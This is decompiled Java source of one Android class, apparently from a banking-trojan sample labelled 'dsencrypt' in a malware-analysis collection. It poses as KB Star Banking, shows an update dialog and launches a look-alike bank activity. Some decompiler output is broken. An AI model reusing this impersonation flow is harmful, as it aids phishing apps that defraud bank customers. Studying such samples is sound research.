package com.kbstar.kb.android.star;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.Window;
import com.kbstar.kb.android.star.util.GeneralUtil;
import java.util.List;

public class OpenMain
  extends Activity
{
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    GeneralUtil.activityList.add(this);
    getWindow().requestFeature(1);
    setContentView(2130903058);
    updateDialog();
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
  }
  
  protected void updateDialog()
  {
    try
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setTitle(getResources().getString(2131361797));
      localBuilder.setMessage(getResources().getString(2131361796));
      localBuilder.setPositiveButton(getResources().getString(2131361804), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface = new Intent();
          paramAnonymousDialogInterface.addFlags(268435456);
          paramAnonymousDialogInterface.setComponent(new ComponentName("com.kbstar.kb.android.K", "com.kbstar.kb.android.star.MainActivity"));
          paramAnonymousDialogInterface.setAction("android.intent.action.VIEW");
          OpenMain.this.startActivity(paramAnonymousDialogInterface);
          OpenMain.this.finish();
        }
      });
      localBuilder.create().show();
      return;
    }
    finally
    {
      localObject = finally;
      throw ((Throwable)localObject);
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/OpenMain.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */